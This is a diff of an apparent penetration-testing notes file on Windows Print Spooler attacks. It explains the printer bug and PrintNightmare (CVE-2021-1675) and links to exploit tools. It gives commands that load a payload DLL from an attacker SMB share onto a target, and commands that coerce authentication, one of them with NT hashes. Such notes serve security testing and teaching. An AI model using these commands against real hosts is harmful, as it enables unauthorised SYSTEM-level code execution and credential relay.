@@ -247,7 +247,31 @@ python samrdump.py <IP | HOSTNAME>
 python samrdump.py [<DOMAIN>/]<USERNAME>:<PASSWORD>@<IP | HOSTNAME>
 ```
 
-### MS-RPRN "printer bug"
+### Print Spooler service
+
+###### Print Spooler enumeration
+
+`PingCastle`'s `spooler` module, `Impacket`'s `rpcdump` Python script, and the
+`Get-SpoolStatus.ps1` PowerShell script can be used to enumerate the servers
+exposing the `MS-RPRN` `MSRPC` interface:
+
+```
+gci \\<HOSTNAME | IP>\pipe\spoolss
+
+Get-SpoolStatus -ComputerName <IP | HOSTNAME>
+
+rpcdump.py '<DOMAIN>/<USERNAME>:<PASSWORD>@<IP | HOSTNAME> | grep -i "MS-RPRN"
+
+# Automates the enumeration of the computers in the domain and conducts the check on all the enumerated computers.
+# Refer to the Active Directory - Automatic scanners note for more information on how to use PingCastle.
+PingCastle.exe --scanner spooler
+# Enumerates and scan only the Domain Controllers.
+# The Domain Controllers of another forest can be scanned using the "--server" option.
+PingCastle.exe --scanner spooler --scmode-dc
+PingCastle.exe --scanner spooler --scmode-dc --server <TARGET_FOREST_DC_FQDN>
+```
+
+###### MS-RPRN "printer bug"
 
 The `RpcRemoteFindFirstPrinterChangeNotification(Ex)` function of the
 `Print System Remote Protocol`, exposed on the `MS-RPRN` `MSRPC` interface, can
@@ -290,26 +314,6 @@ exploited in a number of ways:
   `ActiveDirectory - Kerberos Silver Tickets` notes for more information on the
   attack.
 
-`PingCastle`'s `spooler` module, `Impacket`'s `rpcdump` Python script, and the
-`Get-SpoolStatus.ps1` PowerShell script can be used to enumerate the servers
-exposing the `MS-RPRN` `MSRPC` interface:
-
-```
-gci \\<HOSTNAME | IP>\pipe\spoolss
-
-Get-SpoolStatus -ComputerName <IP | HOSTNAME>
-
-rpcdump.py '<DOMAIN>/<USERNAME>:<PASSWORD>@<IP | HOSTNAME> | grep -i "MS-RPRN"
-
-# Automates the enumeration of the computers in the domain and conducts the check on all the enumerated computers.
-# Refer to the Active Directory - Automatic scanners note for more information on how to use PingCastle.
-PingCastle.exe --scanner spooler
-# Enumerates and scan only the Domain Controllers.
-# The Domain Controllers of another forest can be scanned using the "--server" option.
-PingCastle.exe --scanner spooler --scmode-dc
-PingCastle.exe --scanner spooler --scmode-dc --server <TARGET_FOREST_DC_FQDN>
-```
-
 The `printerbug.py` Python script, of the `krbrelayx` toolkit, can be used to
 call the `SpoolerService` `MSRPC` functions and trigger the authentication
 callback.
@@ -322,4 +326,96 @@ SpoolSample.exe <TARGET_IP | TARGET_HOSTNAME> <LHOST_HOSTNAME>
 
 printerbug.py [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<TARGET_IP | TARGET_HOSTNAME> <LHOST_HOSTNAME>
 printerbug.py -hashes <LMHASH:NTHASH> [<DOMAIN>/]<USERNAME>@<TARGET_IP | TARGET_HOSTNAME> <LHOST_HOSTNAME>
+```
+
+###### PrintNightmare (CVE-2021-1675)
+
+On unpatched systems with the `Print Spooler` service running and exposed, the
+`PrintNightmare` vulnerability (`CVE-2021-1675`) can be leveraged for remote
+code execution. The `PrintNightmare` vulnerability basically result in the
+execution of an arbitrary `DLL` under `NT AUTHORITY\SYSTEM` privileges on the
+remote system.
+
+As of July 2021, [a number of
+parameters](https://twitter.com/StanHacked/status/1410922404252168196)
+determine if the targeted system is vulnerable to the `PrintNightmare`
+vulnerability:
+  - Mandatory exposure of the `Print Spooler` service.
+  - Application of the related security patches.
+  - Even if the remote system is patched, it may still be vulnerable if either:
+    - The targeted system is a Domain Controller and the domain principal used
+      to make the `RPC` calls is a member of the `Pre-Win 2000 compatibility`
+      group.
+    - the `HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall`
+      registry key is set to `0x1` on the remote system.
+    - the `UAC` mechanism is turned off on the remote system (`EnableLUA` set
+      to `0x0`).
+
+The [`ItWasAllADream`](https://github.com/byt3bl33d3r/ItWasAllADream) Python
+script ([`OffensivePythonPipeline`'s standalone
+binary](https://github.com/Qazeer/OffensivePythonPipeline)) can be used to scan
+the network for systems vulnerable to the `PrintNightmare` vulnerability:
+
+```
+itwasalladream -d <WORKGROUP | DOMAIN> -u <USERNAME> [-p <PASSWORD>] <IP/32 | SUBNET_CIDR>
+```
+
+The vulnerability lies in the fact that unprivileged users may call the
+`MS-RPRN`'s `RpcAddPrinterDriverEx` function, normally used to install a
+printer driver on the system. This result in the execution of the provided
+arbitrary `DLL` (as the [`printer
+driver`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/39bbfc30-8768-4cd4-9930-434857e2c2a2))
+by the `Print Spooler` service under `NT AUTHORITY\SYSTEM` privileges.
+
+The following struct corresponds to a `printer driver` as passed as parameter
+to the `RpcAddPrinterDriverEx` function:
+
+```
+typedef struct _DRIVER_INFO_2 {
+   DWORD cVersion;
+   [string] wchar_t* pName;
+   [string] wchar_t* pEnvironment;
+   [string] wchar_t* pDriverPath; # Path to the driver file.
+   [string] wchar_t* pDataFile;   # Path to the driver data file.
+   [string] wchar_t* pConfigFile; # Path to the driver config configuration file.
+ } DRIVER_INFO_2;
+```
+
+While restriction exist on the `pDriverPath` and `pDataFile` attributes, to
+verify that the specified paths are not `UNC` paths (network resources), the
+`pConfigFile` attribute is exempted from such verification. A first call to the
+`RpcAddPrinterDriverEx` function with the payload `DLL` (hosted on a network
+share) passed as `pConfigFile` will result in the `DLL` file being copied on
+the remote system (in the `%SYSTEMROOT%\system32\spool\drivers\x64\3\` folder).
+A subsequent call to the `RpcAddPrinterDriverEx` function with the payload
+`DLL` passed, in its copied path, as the `pDriverPath` will result in execution
+of the `DLL` by the `Print Spooler` service.
+
+The [`nightmare-dll DLL`](
+https://github.com/calebstewart/CVE-2021-1675/tree/main/nightmare-dll) creates
+a local user (using the `Win32`'s `NetUserAdd` API) and add it to the local
+`Administrators` group (using the `Win32`'s `NetLocalGroupAddMembers` API). It
+may be used as a `DLL` template for `PrintNightmare` exploitation.
+Alternatively, a payload `DLL` may be generated using, for example, `msfvenom`.
+
+The [`CVE-2021-1675.py` Python
+script](https://github.com/cube0x0/CVE-2021-1675) ([`OffensivePythonPipeline`'s
+standalone binary](https://github.com/Qazeer/OffensivePythonPipeline)) or the
+[`SharpPrintNightmare` `C#`
+implementation](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare)
+can be used to exploit the `PrintNightmare` vulnerability:
+
+Note that a network share allowing anonymous access and hosting the payload
+`DLL` must first be configured. Refer to the `[General] File Transfer` note
+(`SAMBA shares` or `SMB shares` sections) for a procedure on how to create such
+share.
+
+```
+CVE-2021-1675.py <DOMAIN | WORKGROUP>/<USERNAME>:<PASSWORD>@<TARGET_HOSTNAME | TARGET_IP> '\\<IP>\<SHARE_NAME>>\<DLL>'
+
+# Uses the current security context to authenticate to the remote system.
+SharpPrintNightmare.exe '\\<IP>\<SHARE_NAME>>\<DLL>' '\\<TARGET_HOSTNAME | TARGET_IP>'
+
+# Uses the specified credentials for authentication.
+SharpPrintNightmare.exe '\\<IP>\<SHARE_NAME>>\<DLL>' '\\<TARGET_HOSTNAME | TARGET_IP>' <DOMAIN | WORKGROUP> <USERNAME> <PASSWORD>
 ```
